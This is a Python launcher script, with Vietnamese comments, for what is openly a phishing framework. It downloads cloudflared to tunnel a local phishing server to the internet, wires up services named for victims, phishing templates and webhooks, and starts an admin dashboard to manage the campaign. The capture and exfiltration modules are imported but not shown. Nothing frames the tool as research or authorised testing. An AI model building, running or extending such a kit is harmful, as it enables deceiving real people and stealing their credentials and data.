import os
import sys
import threading
import socket
import signal
from flask import Flask
from config import (ADMIN_PORT, PHISHING_PORT, DATA_DIR, DATABASE_PATH,
                    CLOUDFLARED_PATH, TEMPLATES_DIR)
from core.database import Database
from core.tunnel_service import TunnelService
from core.victim_service import VictimService
from core.template_service import TemplateService
from core.webhook_service import WebhookService
from core.config_service import ConfigService
from core.scheduler_service import SchedulerService
from servers.admin_server import admin_bp
from servers.phishing_server import phishing_bp
from utils.cloudflared import ensure_cloudflared
from utils.sse_manager import SSEManager

def get_free_port():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind(('', 0))
        return s.getsockname()[1]

def main():
    # Tải cloudflared
    ensure_cloudflared()

    # Khởi tạo DB
    db = Database(DATABASE_PATH)
    # Để SSEManager lưu event vào DB (nếu cần)
    SSEManager._db = db

    # Chọn cổng phishing
    phishing_port = PHISHING_PORT if PHISHING_PORT != 0 else get_free_port()
    print(f"[*] Phishing server port: {phishing_port}")

    # Khởi tạo các service
    tunnel_svc = TunnelService(db, phishing_port)
    victim_svc = VictimService(db)
    template_svc = TemplateService(db)
    webhook_svc = WebhookService(db)
    config_svc = ConfigService(db)

    # Scheduler
    scheduler = SchedulerService(tunnel_svc, db)

    # Tạo Flask app cho admin
    admin_app = Flask(__name__)
    admin_app.config['tunnel_service'] = tunnel_svc
    admin_app.config['victim_service'] = victim_svc
    admin_app.config['template_service'] = template_svc
    admin_app.config['webhook_service'] = webhook_svc
    admin_app.config['config_service'] = config_svc
    admin_app.register_blueprint(admin_bp)

    # Tạo Flask app cho phishing
    phishing_app = Flask(__name__)
    phishing_app.config['victim_service'] = victim_svc
    phishing_app.config['template_service'] = template_svc
    phishing_app.config['webhook_service'] = webhook_svc
    phishing_app.register_blueprint(phishing_bp)

    # Chạy phishing server trong thread riêng
    def run_phishing():
        phishing_app.run(host='127.0.0.1', port=phishing_port, debug=False, use_reloader=False)

    phishing_thread = threading.Thread(target=run_phishing, daemon=True)
    phishing_thread.start()

    # Chạy scheduler
    scheduler.start()

    # Bắt đầu monitor tunnel (thread riêng)
    monitor_thread = threading.Thread(target=tunnel_svc.monitor, daemon=True)
    monitor_thread.start()

    # Graceful shutdown
    def shutdown_handler(signum, frame):
        print("[!] Đang tắt...")
        tunnel_svc.stop_all()
        scheduler.shutdown()
        db.close()
        sys.exit(0)

    signal.signal(signal.SIGINT, shutdown_handler)
    signal.signal(signal.SIGTERM, shutdown_handler)

    print(f"[*] Dashboard: http://127.0.0.1:{ADMIN_PORT}")
    admin_app.run(host='127.0.0.1', port=ADMIN_PORT, debug=False, threaded=True)

if __name__ == '__main__':
    main()
